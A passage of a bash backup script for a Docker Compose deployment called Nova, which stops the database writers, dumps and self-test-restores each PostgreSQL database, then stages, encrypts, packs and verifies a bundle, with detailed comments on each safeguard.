        bk_fail "there is no container of this project for the writer \`$svc\`, so
       nothing can confirm it stopped. \"Could not confirm\" is a failure, not a
       pass."
        return 1
      fi
      running="$(bk_docker inspect "$id" --format '{{.State.Running}}' 2>/dev/null)"
      if [ -z "$running" ]; then
        bk_fail "docker inspect could not say whether \`$svc\` ($id) is running."
        return 1
      fi
      [ "$running" = "false" ] || pending="$pending $svc"
    done
    [ -n "$pending" ] || break
    now="$(date +%s)"
    if [ "$now" -ge "$deadline" ]; then
      bk_fail "could not confirm$pending stopped within 60s. Nothing was dumped, and
       everything this run stopped is being restarted."
      return 1
    fi
    sleep 2
  done
  for svc in "$@"; do
    id="$(bk_container_id "$svc" any)"
    finished="$(bk_docker inspect "$id" --format '{{.State.FinishedAt}}' 2>/dev/null)"
    if [ -z "$finished" ]; then
      bk_fail "docker inspect could not report .State.FinishedAt for \`$svc\` ($id)."
      return 1
    fi
    if ! bk_str_ge "$(printf '%s' "$finished" | cut -c1-19)" "$issued"; then
      bk_fail "\`$svc\` ($id) finished at $finished, which is before this run issued its
       stop at ${issued}Z. It was already down for some other reason, so this run
       cannot claim to have quiesced it."
      return 1
    fi
  done
  return 0
}

# The services of $1 (one per line) that are NOT running. Empty output, exit
# 0, means every one of them came back.
#
# `up -d` exiting 0 is not "it came back": compose returns 0 for a container
# that starts and dies a second later, and the paths this is called from are
# the ones that must never report a state they did not read. Running and not
# healthy on purpose: this is the failure path, it runs from the EXIT trap
# (Ctrl-C included), and a 240 s health budget there would turn an
# interrupted backup into four minutes of silence.
bk_verify_running() {
  local list="$1" deadline pending svc id running now
  [ -n "$list" ] || return 0
  deadline=$(( $(date +%s) + 60 ))
  while :; do
    pending=""
    while IFS= read -r svc; do
      [ -n "$svc" ] || continue
      id="$(bk_container_id "$svc" running)"
      if [ -z "$id" ]; then
        pending="$pending $svc"
        continue
      fi
      running="$(bk_docker inspect "$id" --format '{{.State.Running}}' 2>/dev/null)"
      [ "$running" = "true" ] || pending="$pending $svc"
    done <<EOF
$list
EOF
    [ -z "$pending" ] && return 0
    now="$(date +%s)"
    if [ "$now" -ge "$deadline" ]; then
      printf '%s' "$pending"
      return 1
    fi
    sleep 2
  done
}

# Restart $@ and say whether each came back HEALTHY — not whether compose
# accepted the command. A service with no healthcheck has no health to read,
# and that is stated rather than counted as healthy.
bk_wait_healthy() {
  local timeout=240 started now svc id health state pending
  started="$(date +%s)"
  while :; do
    pending=""
    for svc in "$@"; do
      id="$(bk_container_id "$svc" running)"
      if [ -z "$id" ]; then
        pending="$pending $svc"
        continue
      fi
      health="$(bk_docker inspect "$id" --format '{{if .State.Health}}{{.State.Health.Status}}{{else}}none{{end}}' 2>/dev/null)"
      state="$(bk_docker inspect "$id" --format '{{.State.Status}}' 2>/dev/null)"
      case "$health" in
        healthy) ;;
        none) [ "$state" = "running" ] || pending="$pending $svc" ;;
        *) pending="$pending $svc" ;;
      esac
    done
    [ -n "$pending" ] || return 0
    now="$(date +%s)"
    if [ "$now" -ge $((started + timeout)) ]; then
      printf '%s' "${pending# }"
      return 1
    fi
    sleep 2
  done
}

# ── the verb (design-verdict.md §9.1) ───────────────────────────────────────

# `set -e` is turned OFF for the length of this verb, and restored on the way
# out. deploy/install.sh:8 is `set -euo pipefail` and it sources this file;
# every step below states its own refusal, and under `-e` the shell exits at
# the first `x="$(cmd)"` whose command failed — BEFORE the `[ -z "$x" ]` that
# would have said why. A verb whose contract is "if a step cannot verify its
# own result it FAILS and says why" cannot run under a setting that replaces
# each of those sentences with a silent exit and a bare status.
#
# `-u` and `pipefail` stay on: both turn a mistake into a loud failure rather
# than into a quiet wrong answer, and `pipefail` is what caught
# writer_services returning 1 on every real stack.
#
# bash 3.2 has no `local -`, so the flag is saved and put back by hand.
cmd_backup() {
  local had_e=0 code=0
  case "$-" in
    *e*) had_e=1; set +e ;;
  esac
  bk_backup_run "$@"
  code=$?
  if [ "$had_e" -eq 1 ]; then
    set -e
  fi
  return "$code"
}

bk_backup_run() {
  local mode="routine" transport="local" out=""
  local stage lock stamp host final part vol facts root
  local pw pw_source rc line
  local cov entries_n writers writers_list issued missing extra vol_kb want_kb
  local pg_id pg_image_id pack_id pack_name pg_tag
  local srv_ver srv_num dump_ver dump_major net
  local db owner scratch census_src census_dst tables rows dumpline
  local dbytes dsha toc key full svc _target disp name why
  local plan_out pack_out rt_out
  local sha bytes uid gid final_mode collide dump_major
  local dbs_json first
  local carried_keys env_body signing devices people dns
  local need_out have_out need_pg have_pg total_kb pg_kb
  local unhealthy

  while [ $# -gt 0 ]; do
    case "$1" in
      --move) mode="move" ;;
      --transport) shift; transport="${1:-}" ;;
      --transport=*) transport="${1#--transport=}" ;;
      --out) shift; out="${1:-}" ;;
      --out=*) out="${1#--out=}" ;;
      -h | --help)
        printf './install backup [--move] [--transport local|tailnet|removable] [--out DIR]\n'
        return 0
        ;;
      *)
        bk_fail "backup: unknown option '$1'. Usage:
       ./install backup [--move] [--transport local|tailnet|removable] [--out DIR]"
        return 2
        ;;
    esac
    shift
  done
  case "$transport" in
    local | tailnet | removable) ;;
    *)
      bk_fail "backup: --transport is one of local, tailnet or removable; got '$transport'."
      return 2
      ;;
  esac
  BK_RUN_MODE="$mode"
  BK_RUN_CLEANED=0
  [ -n "$out" ] || out="$(bk_out_dir)"

  # ── 1. the run lock, and a moved host ────────────────────────────────────
  #
  # mkdir is atomic on every filesystem. Without it two runs in the same
  # second both compute the same <final>, both write <final>.part, and the
  # verify reads the file both are touching (shell-first M11).
  if ! mkdir -p "$out" 2>/dev/null; then
    bk_fail "could not create the archive directory $out."
    return 1
  fi
  lock="$out/.nova-backup.lock"
  if ! mkdir "$lock" 2>/dev/null; then
    bk_fail "a backup is already running (lock held since $(cat "$lock/started" 2>/dev/null || printf 'an unrecorded time')).
       If nothing is running, remove $lock."
    return 1
  fi
  BK_RUN_LOCK="$lock"
  stamp="$(bk_stamp)"
  printf '%s\n' "$stamp" > "$lock/started"
  trap 'bk_backup_cleanup; exit 1' INT TERM
  trap 'bk_backup_cleanup' EXIT

  if [ -e "$(bk_moved_marker)" ]; then
    bk_fail "this host was parked by a \`backup --move\`:

$(sed 's/^/       /' "$(bk_moved_marker)" 2>/dev/null)

       Nova is meant to be running somewhere else. If it is not, run
       \`./install undo-move\` here first."
    return 1
  fi

  # ── 2. the archive directory's mode, probed ON THE HOST ──────────────────
  bk_mode_probe "$out" || return 1
  printf 'archive: %s holds owner-only permissions (a 0600 probe file read back 0600)\n' "$out"

  # ── 3. the facts, taken fresh ────────────────────────────────────────────
  #
  # Never cached: the refusals must reflect the stack at the moment a bundle
  # is written (backend/app/backup_service.py:99-101).
  stage="$(mktemp -d "${TMPDIR:-/tmp}/nova-backup-stage.XXXXXX")" || return 1
  chmod 700 "$stage"
  BK_RUN_STAGE="$stage"
  facts="$stage/facts"
  render_facts "$stage" "$mode" || return 1
  bk_set_compose_args
  # Every service this project declares, in every profile — what a `--move`
  # stops, and therefore what a failed `--move` has to bring back.
  BK_RUN_SERVICES="$(cfg_service_keys < "$facts/config.yaml")"
  if [ -z "$BK_RUN_SERVICES" ]; then
    bk_fail "the render names no service, so nothing here could say what a failed
       run would have to restart."
    return 1
  fi
  printf 'facts: 8 rendered from this stack and parsed\n'
  root="$(bk_git_root "$facts")"
  if [ -z "$root" ]; then
    bk_fail "git.json records no work-tree root, so no host file has an address."
    return 1
  fi

  # ── 4. coverage — BEFORE anything is stopped, and before the free-space
  #      check, which needs the include set coverage produces ──────────────
  BK_PACK_IMAGE="$(pack_image)" || return 1
  pack_id="$BK_PACK_IMAGE"
  pack_name="$(pack_image_name)" || pack_name="$pack_id"
  cov="$stage/coverage.json"
  # `rc=$?` must NOT sit inside `if ! cmd; then` — there `$?` is the status of
  # the NEGATION, which is 0 whenever the command failed. A coverage REFUSAL
  # then returned 0 and the verb reported success having written nothing,
  # which is the defect this whole slice exists against. Measured by
  # `a_coverage_refusal_exits_3_and_is_never_reported_as_success`.
  rc=0
  bk_nova -v "$facts:/facts:ro" "$BK_PACK_IMAGE" \
    python3 /novabundle/novabundle.py coverage --facts /facts --mode "$mode" > "$cov" || rc=$?
  if [ "$rc" -ne 0 ]; then
    # §6.6: novabundle.py has already printed the whole refusal. This adds
    # nothing and propagates the code unchanged.
    return "$rc"
  fi
  entries_n="$(bk_coverage_rows < "$cov" | wc -l | tr -d ' ')"
  if [ "$entries_n" -lt 1 ]; then
    bk_fail "coverage exited 0 and this shell read no entry out of its answer. A short
       list here is a bundle that carries less than the stack holds, so the run
       stops rather than proceeding with whatever it managed to parse."
    return 1
  fi
  printf 'coverage: %s entries classified, 0 refusals\n' "$entries_n"

  # ── 4b. the databases, against a SECOND source (§6.1), BEFORE the stop ───
  #
  # `plan` already refuses a carried VOLUME whose tree is not staged. For
  # databases it iterates the list this shell wrote, and until now nothing
  # compared that list with anything: one dropped row between pg_database and
  # here published a bundle carrying two databases of three, exit 0, with the
  # manifest, the payload self-verify and the shipped reader all agreeing
  # with each other about the short set.
  #
  # Neither source is preferred. The catalogue can over-report (a database
  # nothing uses) and the parse can under-report (a row it did not
  # anticipate); a bundle that carries the wrong set of databases is the one
  # failure this verb must never report as success, so a disagreement is a
  # refusal and the operator is told what each side said.
  bk_coverage_rows < "$cov" | awk -F'\037' '$1 == "database" { print $2 }' |
    LC_ALL=C sort > "$stage/dbs.carried"
  bk_dsn_databases < "$facts/config.yaml" > "$stage/dbs.named"
  missing="$(comm -13 "$stage/dbs.carried" "$stage/dbs.named" | tr '\n' ' ')"
  extra="$(comm -23 "$stage/dbs.carried" "$stage/dbs.named" | tr '\n' ' ')"
  if [ -n "${missing# }" ] || [ -n "${extra# }" ]; then
    bk_fail "the two sources disagree about which databases this stack holds, and
       neither one is preferred over the other.
         the catalogue (facts/databases.json, classified by coverage) says:$(sed 's/^/ /' "$stage/dbs.carried" | tr '\n' ' ')
         the render's postgres DSNs say:$(sed 's/^/ /' "$stage/dbs.named" | tr '\n' ' ')
         a service names it and this run would NOT carry it: ${missing:-nothing}
         this run would carry it and no service names it: ${extra:-nothing}
       Nothing was stopped, dumped or written. If a database here is genuinely
       one nothing uses, drop it or give the service that owns it its DSN; if
       one is missing from the first list, the reading that produced that list
       failed and the bundle would have been short a tier of his data."
    return 1
  fi
  printf 'databases: %s, and the render'"'"'s postgres DSNs name the same set\n' \
    "$(tr '\n' ' ' < "$stage/dbs.carried" | sed 's/ $//')"

  # ── 5. the passphrase — before the du pass, so a missing one refuses
  #      without spending containers on measurement ─────────────────────────
  pw_source="$(nova_passphrase_source)"
  # A prompt-sourced backup has no stored copy to check the typing against, so
  # the entry is confirmed. A file/env/cmd source is read, not typed.
  if [ "$pw_source" = "prompt" ]; then
    NOVA_PASSPHRASE_CONFIRM=1
    export NOVA_PASSPHRASE_CONFIRM
  fi
  rc=0
  pw="$(resolve_passphrase)" || rc=$?
  if [ "$rc" -eq 3 ]; then
    pw="$(create_passphrase bk_genpass)" || return 1
  elif [ "$rc" -ne 0 ]; then
    bk_fail "no passphrase, no bundle. The resolver '$pw_source' exited $rc, which is
       UNAVAILABLE rather than absent, so nothing here generates a replacement
       over the passphrase that still seals every existing bundle."
    return 1
  fi
  if [ -z "$pw" ]; then
    bk_fail "the passphrase resolver '$pw_source' exited 0 and produced nothing."
    return 1
  fi
  printf 'passphrase: resolved from `%s`\n' "$pw_source"

  # ── 6. free space, twice, in kilobytes ───────────────────────────────────
  pg_id="$(bk_container_id postgres running)"
  if [ -z "$pg_id" ]; then
    bk_fail "no RUNNING postgres container under this project's label, so nothing can
       be dumped or measured."
    return 1
  fi
  BK_RUN_PG_ID="$pg_id"
  pg_image_id="$(pg_image)" || return 1
  pg_tag="$(bk_cfg_service_image postgres < "$facts/config.yaml")"
  [ -n "$pg_tag" ] || pg_tag="postgres"

  total_kb=0
  # Step 6 measures every carried source; step 12 copies the same sources.
  # The two numbers were never compared, so a volume that EMPTIED between
  # them was carried as "0 entries, 0 files, 0 bytes" with exit 0 — every one
  # of bk_tar_volume's checks is self-relative and 0 == 0 passes all three.
  # `v4_workspace` is legitimately empty, which is precisely why the only
  # thing that can tell the two apart is what this pass measured.
  vol_kb=""
  while IFS=$'\037' read -r key name disp full svc _target why; do
    [ "$disp" = "include" ] || continue
    case "$key" in
      volume | anon)
        line="$(bk_volume_du_kb "${full:-$name}" "$pg_image_id" 2>/dev/null | tr -dc '0-9')"
        vol_kb="$vol_kb$name	$line
"
        ;;
      path)
        line="$(du -sk "$root/$name" 2>/dev/null | cut -f1 | tr -dc '0-9')"
        ;;
      bind)
        line="$(du -sk "$name" 2>/dev/null | cut -f1 | tr -dc '0-9')"
        ;;
      *) continue ;;
    esac
    if [ -z "$line" ]; then
      bk_fail "could not measure the size of $key ${full:-$name}, which this bundle
       carries. A source nobody measured is a source nobody proved there is room
       for."
      return 1
    fi
    total_kb=$((total_kb + line))
  done <<EOF
$(bk_coverage_rows < "$cov")
EOF

  # The cast is load-bearing: `sum(bigint)` is NUMERIC, so `/ 1024` yields a
  # decimal, and the sanitiser used to strip the point rather than the value.
  # Integer division in SQL, validated on the way in.
  pg_kb="$(bk_psql "$pg_id" postgres "SELECT (coalesce(sum(pg_database_size(datname)), 0) / 1024)::bigint FROM pg_database WHERE datallowconn AND datname NOT IN ('postgres', 'template0', 'template1')" 2>/dev/null | tr -d '[:space:]')"
  pg_kb="$(bk_digits_or_fail "$pg_kb" "the summed pg_database_size")" || return 1
  if [ -z "$pg_kb" ]; then
    bk_fail "could not read the summed pg_database_size from the live server."
    return 1
  fi
  total_kb=$((total_kb + pg_kb))

  have_out="$(detect_disk_free_kb "$out")"
  if [ -z "$have_out" ]; then
    bk_fail "\`df -Pk $out\` answered nothing, so nothing here knows whether there is
       room for the bundle."
    return 1
  fi
  need_out="$(bk_need_out_kb "$total_kb")"
  if [ "$have_out" -lt "$need_out" ]; then
    bk_fail "$out has ${have_out} KB free and this run needs ${need_out} KB — four copies
       of the ${total_kb} KB it carries (the staging tree, inner.tgz, payload.enc,
       the .part, and the round trip's streamed re-read)."
    return 1
  fi

  have_pg="$(bk_pgdata_free_kb "$pg_id")"
  if [ -z "$have_pg" ]; then
    bk_fail "\`df -Pk /var/lib/postgresql/data\` inside the live postgres container
       answered nothing, so nothing here knows whether the self-test restore has
       room."
    return 1
  fi
  need_pg="$(bk_need_pgdata_kb "$pg_kb")"
  if [ "$have_pg" -lt "$need_pg" ]; then
    bk_fail "the postgres container's /var/lib/postgresql/data has ${have_pg} KB free and
       the self-test restore needs ${need_pg} KB — a full second copy of the
       ${pg_kb} KB of databases, on THAT filesystem and not on $out."
    return 1
  fi
  printf 'free space: %s needs %s KB and has %s KB; PGDATA needs %s KB and has %s KB\n' \
    "$out" "$need_out" "$have_out" "$need_pg" "$have_pg"

  # ── 7. stop the writers, and derive who they are ─────────────────────────
  writers="$(writer_services "$stage" "$mode")" || return 1
  writers_list=""
  while IFS= read -r svc; do
    [ -n "$svc" ] || continue
    writers_list="$writers_list $svc"
  done <<EOF
$writers
EOF
  if [ -z "$writers_list" ]; then
    bk_fail "the writer set came out empty. Nova's core, gateway and memory all hold a
       postgres DSN, so an empty set is a reading that failed, not a stack with
       nothing writing to it."
    return 1
  fi
  issued="$(bk_now_iso)"
  BK_RUN_STOPPED="$writers"
  # shellcheck disable=SC2086  # $writers_list is a list of service names by design
  bk_stop_writers "$issued" $writers_list || return 1
  printf 'writers stopped (%s):%s\n' \
    "$(printf '%s\n' "$writers" | sed '/^$/d' | wc -l | tr -d ' ')" "$writers_list"

  # ── 8. postgres alive, and the versions agree ────────────────────────────
  if ! bk_docker exec "$pg_id" pg_isready -U postgres >/dev/null 2>&1; then
    bk_fail "pg_isready -U postgres inside $pg_id did not answer. The writers are being
       restarted; nothing was dumped."
    return 1
  fi
  srv_ver="$(bk_psql "$pg_id" postgres "SHOW server_version" 2>/dev/null)"
  srv_num="$(bk_psql "$pg_id" postgres "SHOW server_version_num" 2>/dev/null | tr -dc '0-9')"
  dump_ver="$(bk_pg_run --network none --entrypoint pg_dump "$pg_image_id" --version 2>/dev/null | awk '{print $NF}')"
  if [ -z "$srv_ver" ] || [ -z "$srv_num" ] || [ -z "$dump_ver" ]; then
    bk_fail "could not read all three versions (server '$srv_ver', server_version_num
       '$srv_num', pg_dump '$dump_ver'). A dump taken by a pg_dump nobody could
       identify is a dump nobody can promise restores."
    return 1
  fi
  dump_major="${dump_ver%%.*}"
  if [ "${srv_ver%%.*}" != "$dump_major" ]; then
    bk_fail "the live server is PostgreSQL $srv_ver and the image's pg_dump is
       $dump_ver — major ${srv_ver%%.*} against major $dump_major. A cross-major dump is
       not a dump this tool will claim restores."
    return 1
  fi
  printf 'postgres: server %s (%s), pg_dump %s, majors agree (%s)\n' \
    "$srv_ver" "$srv_num" "$dump_ver" "$dump_major"

  # ── the staging volume: a throwaway the HOST NEVER MOUNTS ────────────────
  #
  # The plaintext dumps hold the signing key and every provider API key, and
  # env/carried.env holds every generated secret. None of it lands on the host
  # filesystem: it is written into this volume by a container and read out of
  # it by a container.
  vol="nova-backup-stage-$stamp-$$"
  if ! bk_docker volume create "$vol" >/dev/null 2>&1; then
    bk_fail "could not create the staging volume $vol."
    return 1
  fi
  BK_RUN_STAGE_VOL="$vol"
  if ! bk_pg_run --network none -v "$vol:/stage" --entrypoint sh "$pg_image_id" -ec \
    'umask 077; mkdir -p /stage/inner/db /stage/inner/listings /stage/inner/volumes /stage/inner/files /stage/inner/env'; then
    bk_fail "could not lay out the staging volume $vol."
    return 1
  fi
  # libpq reads the password from a file inside that same volume rather than
  # from `-e PGPASSWORD`, which `docker inspect` would show for the
  # container's whole lifetime.
  line="$(bk_env_value POSTGRES_PASSWORD)"
  if [ -z "$line" ]; then
    bk_fail "$(bk_env_file) carries no POSTGRES_PASSWORD, so no throwaway container can
       reach the server to dump it."
    return 1
  fi
  printf '*:*:*:postgres:%s\n' "$(printf '%s' "$line" | sed 's/[\\:]/\\&/g')" |
    bk_stage_put "$vol" "$pg_image_id" ".pgpass" || {
      bk_fail "could not stage the postgres password inside $vol."
      return 1
    }
  bk_pg_run --network none -v "$vol:/stage" --entrypoint chmod "$pg_image_id" 600 /stage/.pgpass >/dev/null 2>&1
  net="$(bk_cfg_network_name default < "$facts/config.yaml")"
  if [ -z "$net" ]; then
    bk_fail "the render names no docker network for the compose network \`default\`, so
       a throwaway container has nothing to join to reach postgres."
    return 1
  fi

  # ── 9/10/11. census, dump, self-test restore — per database ──────────────
  dbs_json=""
  first=1
  while IFS=$'\037' read -r key name disp full svc _target why; do
    [ "$key" = "database" ] || continue
    db="$name"
    owner="$(awk -v d="$db" '
      $0 ~ "\"name\": \"" d "\"" { line = $0; sub(/^.*"owner": "/, "", line); sub(/".*$/, "", line); print line; exit }
    ' "$facts/databases.json")"
    if [ -z "$owner" ]; then
      bk_fail "facts/databases.json names $db with no owning role."
      return 1
    fi

    # 9. the census, under the six pinned GUCs, in the same statement.
    census_src="$stage/$db.counts.tsv"
    bk_census "$pg_id" "$db" > "$census_src" || return 1
    tables="$(wc -l < "$census_src" | tr -d ' ')"
    rows="$(awk -F'\t' '{ n += $2 } END { printf "%d", n }' "$census_src")"
    printf 'census %s: %s tables measured, %s rows\n' "$db" "$tables" "$rows"
    # Both TSVs are READ BACK out of the staging volume. The counts file is
    # what step 11's self-test compares and what a restore diffs against; the
    # migrations file is what §9.2 step 7's content gate reads. A copy nobody
    # hashed is a copy nobody proved arrived.
    line="$(sha256_of "$census_src")" || return 1
    bk_stage_put_verified "$vol" "$pg_image_id" "inner/db/$db.counts.tsv" "$line" \
      < "$census_src" || return 1
    bk_migrations_tsv "$pg_id" "$db" > "$stage/$db.migrations.tsv" || return 1
    line="$(sha256_of "$stage/$db.migrations.tsv")" || return 1
    bk_stage_put_verified "$vol" "$pg_image_id" "inner/db/$db.migrations.tsv" "$line" \
      < "$stage/$db.migrations.tsv" || return 1

    # 10. the dump, into the stage volume, BEFORE any file is copied: an
    #     attachment written between the two shows up as a file with no row,
    #     which is recoverable; a row with no blob is not
    #     (backend/app/backup_snapshot.py:230-235).
    dumpline="$(bk_dump_db "$vol" "$pg_image_id" "$net" "$db")" || return 1
    dbytes="$(printf '%s' "$dumpline" | awk '{print $1}')"
    dsha="$(printf '%s' "$dumpline" | awk '{print $2}')"
    toc="$(printf '%s' "$dumpline" | awk '{print $3}')"
    printf 'dump %s: PGDMP, %s bytes, %s table-of-contents entries, sha256 %s\n' \
      "$db" "$dbytes" "$toc" "$dsha"

    # 11. the self-test restore, and the SAME census over it.
    scratch="$(bk_selftest_name)" || return 1
    bk_selftest_db "$vol" "$pg_image_id" "$net" "$pg_id" "$db" "$scratch" "$owner" || return 1
    census_dst="$stage/$db.selftest.tsv"
    bk_census "$pg_id" "$scratch" > "$census_dst" || return 1
    if ! diff "$census_src" "$census_dst" >/dev/null 2>&1; then
      line="$(diff "$census_src" "$census_dst" 2>/dev/null | sed -n '2p;4p' | tr '\n' ' ')"
      bk_fail "the self-test restore of $db does not measure equal. First difference:
       $line
       Both were measured under the same six pinned GUCs, so this is the data, not
       the frame."
      return 1
    fi
    printf 'self-test %s: %s tables compared in %s, every count and digest equal\n' \
      "$db" "$tables" "$scratch"

    [ "$first" -eq 1 ] || dbs_json="$dbs_json,"
    first=0
    dbs_json="$dbs_json
    {\"name\": \"$(bk_j "$db")\", \"owner\": \"$(bk_j "$owner")\",
     \"dump_member\": \"db/$(bk_j "$db").dump\", \"dump_bytes\": $dbytes,
     \"dump_sha256\": \"$dsha\",
     \"counts_member\": \"db/$(bk_j "$db").counts.tsv\",
     \"migrations_member\": \"db/$(bk_j "$db").migrations.tsv\",
     \"tables\": $tables, \"rows\": $rows,
     \"selftest\": {\"scratch_db\": \"$scratch\", \"tables_compared\": $tables, \"equal\": true}}"
  done <<EOF
$(bk_coverage_rows < "$cov")
EOF
  if [ "$first" -eq 1 ]; then
    bk_fail "no database was carried. Nova's state is three databases, so none is a
       reading that failed."
    return 1
  fi

  # ── 12. every carried volume, copied and listed ──────────────────────────
  while IFS=$'\037' read -r key name disp full svc _target why; do
    [ "$disp" = "include" ] || continue
    case "$key" in volume | anon) ;; *) continue ;; esac
    want_kb="$(printf '%s' "$vol_kb" | awk -F'\t' -v k="$name" '$1 == k { print $2; exit }')"
    bk_tar_volume "$vol" "$pg_image_id" "$name" "${full:-$name}" "$want_kb" || return 1
  done <<EOF
$(bk_coverage_rows < "$cov")
EOF

  # ── 13. every carried host file, and the carried .env keys ───────────────
  while IFS=$'\037' read -r key name disp full svc _target why; do
    [ "$disp" = "include" ] || continue
    case "$key" in
      path) bk_stage_host_path "$vol" "$pg_image_id" "$root/$name" "$name" || return 1 ;;
      bind)
        case "$name" in
          "$root"/*) ;;
          *)
            bk_fail "the bind $name is classified \`include\` and it is outside the work
       tree at $root. A carried file's address in the bundle is its repo-relative
       path (§5.3 members[].restore_to), and this one has none — so nothing could
       say where to put it back."
            return 1
            ;;
        esac
        bk_stage_host_path "$vol" "$pg_image_id" "$name" "${name#"$root"/}" || return 1
        ;;
      *) continue ;;
    esac
  done <<EOF
$(bk_coverage_rows < "$cov")
EOF

  carried_keys="$(bk_carry_keys "$facts")"
  env_body=""
  while IFS= read -r key; do
    [ -n "$key" ] || continue
    env_body="$env_body$key=$(bk_env_value "$key")
"
  done <<EOF
$carried_keys
EOF
  if [ -n "$env_body" ]; then
    # Hashed from the bytes being sent, never from a host file: these are the
    # generated secrets, and §9.1 step 10's whole point is that they never
    # land on this filesystem. `sha256_of -` reads the same pipe.
    line="$(printf '%s' "$env_body" | sha256_of -)" || return 1
    printf '%s' "$env_body" |
      bk_stage_put_verified "$vol" "$pg_image_id" "inner/env/carried.env" "$line" || return 1
  fi
  printf 'env: %s of %s keys carried; the rest are this machine'"'"'s and stay here\n' \
    "$(printf '%s\n' "$carried_keys" | sed '/^$/d' | wc -l | tr -d ' ')" \
    "$(bk_env_keys "$facts/env.json" | wc -l | tr -d ' ')"

  # ── 14. the crypto self-test, before anything is written ─────────────────
  line="$(printf '%s\n' "$pw" | bk_nova "$BK_PACK_IMAGE" \
    python3 /novabundle/novabundle.py kat)" || {
      bk_fail "the pack image $pack_name ($pack_id) cannot do NOVAENC1 with this
       passphrase, so nothing it wrote could be opened again. No bundle was
       written."
      return 1
    }
  printf 'crypto self-test: %s / %s round-tripped 64 known bytes in %s\n' \
    "$(printf '%s' "$line" | bk_json_field container)" \
    "$(printf '%s' "$line" | bk_json_field cipher)" "$pack_name"

  # ── 15. the manifest ─────────────────────────────────────────────────────
  bk_write_manifest_base "$stage" "$facts" "$mode" "$transport" "$stamp" \
    "$pw_source" "$pack_id" "$pg_id" "$pg_image_id" "$pg_tag" \
    "$srv_ver" "$srv_num" "$dump_ver" "$dump_major" "$dbs_json" || return 1

  plan_out="$(printf '%s\n' "$pw" | bk_nova -v "$vol:/stage" -v "$facts:/facts:ro" \
    "$BK_PACK_IMAGE" python3 /novabundle/novabundle.py plan \
    --facts /facts --stage /stage --mode "$mode")" || {
      rc=$?
      bk_fail "assembling MANIFEST.json failed (exit $rc). No bundle was written."
      return "$rc"
    }
  printf 'manifest: %s members, %s volumes, %s databases, %s excluded rows\n' \
    "$(printf '%s' "$plan_out" | bk_json_field member_count)" \
    "$(printf '%s' "$plan_out" | bk_json_field volumes)" \
    "$(printf '%s' "$plan_out" | bk_json_field databases)" \
    "$(printf '%s' "$plan_out" | bk_json_field excluded)"

  # ── 16/18/19. pack, the outer tar, and the chown ─────────────────────────
  #
  # One container run, because §4 names no verb for the outer tar or the chown
  # and the chown-and-re-stat can only be enforced where the file is created
  # (T2's report, ruling C). <final> is chosen here, with the collision loop,
  # so the .part sits in $OUT and step 21's rename is intra-filesystem by
  # construction — --transport removable makes a cross-filesystem rename the
  # normal case otherwise, and it fails after the expensive part (port-v3 m7).
  host="$(uname -n)"
  final="$out/$(archive_name "$host" "$stamp")"
  collide=2
  while [ -e "$final" ]; do
    final="$out/$(archive_name "$host" "$stamp" | sed "s/\\.tar\$/-$collide.tar/")"
    collide=$((collide + 1))
    if [ "$collide" -gt 99 ]; then
      bk_fail "99 bundles already carry this second's stamp in $out."
      return 1
    fi
  done
  part="$final.part"
  BK_RUN_PART="$part"
  uid="$(id -u)"
  gid="$(id -g)"
  pack_out="$(printf '%s\n' "$pw" | bk_nova -v "$vol:/stage" -v "$out:/out" \
    "$BK_PACK_IMAGE" python3 /novabundle/novabundle.py pack \
    --stage /stage --out "/out/$(basename "$part")" \
    --uid "$uid" --gid "$gid" \
    --crypto-image "$pack_name" \
    --needs-image "$pg_tag" --needs-image python:3.12-slim)" || {
      bk_fail "packing the bundle failed. Nothing was published."
      return 1
    }
  bytes="$(printf '%s' "$pack_out" | bk_json_field bytes)"
  sha="$(printf '%s' "$pack_out" | bk_json_field sha256)"
  printf 'pack: %s bytes at %s, mode %s, owner %s:%s\n' "$bytes" "$part" \
    "$(printf '%s' "$pack_out" | bk_json_field mode)" \
    "$(printf '%s' "$pack_out" | bk_json_field uid)" \
    "$(printf '%s' "$pack_out" | bk_json_field gid)"

  # ── 19, the half only the host can prove ─────────────────────────────────
  #
  # python-tool C3, and it is a measured incident: a container writing the
  # archive produces a root-owned mode-0600 file, and the host-side
  # verification — running as the operator — then cannot read it back
  # (map-minipc-measured.md:164-171). OWNERSHIP is what was relaxed; the mode
  # is not, because a world-readable backup trades one failure for a worse
  # one.
  line="$(sha256_of "$part")" || {
    bk_fail "the bundle was written and this user cannot read it back. The chown the
       container reported did not survive: $part."
    return 1
  }
  if [ "$line" != "$sha" ]; then
    bk_fail "the container hashed $part to $sha and this user reads $line. Two
       different files, or a file that changed between them."
    return 1
  fi
  printf 'the operator read it back: sha256 %s\n' "$line"

  # ── 17. the payload, re-read from its own decrypted bytes ────────────────
  #
  # Deliberately not trusting the numbers the manifest recorded moments ago.
  if ! printf '%s\n' "$pw" | bk_nova -v "$vol:/stage" "$BK_PACK_IMAGE" \
    python3 /novabundle/novabundle.py verify --payload /stage/payload.enc >/dev/null; then
    bk_fail "the payload does not re-read: every member's sha256 was re-derived from
       the decrypted bytes and at least one did not match. The .part is being
       deleted."
    return 1
  fi
  printf 'payload: every member re-hashed from its own decrypted bytes\n'

  # ── 20. the round trip, with the reader that ships INSIDE the bundle ─────
  #
  # port-v3 M11. The sha256-equality assertion alone proves the file is the
  # right bytes; it does not prove those bytes can open THIS payload, and that
  # is the difference between "the format round-trips" and "this artifact is
  # restorable". `cryptography` is forced unimportable, so the ctypes
  # libcrypto path — the one a bare machine takes — is the path proven.
  if ! printf '%s\n' "$pw" | bk_nova -v "$vol:/stage" -v "$out:/out" "$BK_PACK_IMAGE" \
    python3 /novabundle/novabundle.py verify --bundle "/out/$(basename "$part")" \
    --reader-dir /novabundle >/dev/null; then
    bk_fail "the finished bundle does not verify. The .part is being deleted."
    return 1
  fi
  rt_out="$(printf '%s\n' "$pw" | bk_docker run --rm -i --network none --user 0:0 \
    -v "$BK_DIR/backup:/novabundle:ro" -v "$out:/out" --entrypoint sh "$BK_PACK_IMAGE" -ec '
      mkdir -p /tmp/shipped
      tar -xOf "$1" nova_restore.py > /tmp/shipped/nova_restore.py
      [ -s /tmp/shipped/nova_restore.py ]
      cmp -s /tmp/shipped/nova_restore.py /novabundle/nova_restore.py
      NOVA_FORCE_CTYPES_GCM=1 python3 /tmp/shipped/nova_restore.py --verify-only "$1"
    ' sh "/out/$(basename "$part")")" || {
      bk_fail "the reader that ships inside the bundle could not open it, or is not
       byte-identical to deploy/backup/nova_restore.py. The .part is being
       deleted."
      return 1
    }
  printf 'the reader carried inside the bundle opened it with no `cryptography` present\n'
  printf '%s\n' "$rt_out" | sed 's/^/  /'

